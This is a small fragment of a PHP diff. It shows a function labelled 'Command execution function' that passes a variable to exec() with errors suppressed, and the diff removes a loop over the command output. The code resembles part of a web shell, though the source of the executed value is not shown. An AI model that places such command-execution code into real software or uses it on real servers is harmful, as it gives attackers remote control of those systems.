@@ -21,7 +21,6 @@ function cmd(){ // Command execution function
 	else
 		die();
 	$cmd = @exec($x, $result);
-	foreach($result as $line)
 }
 
 cmd();
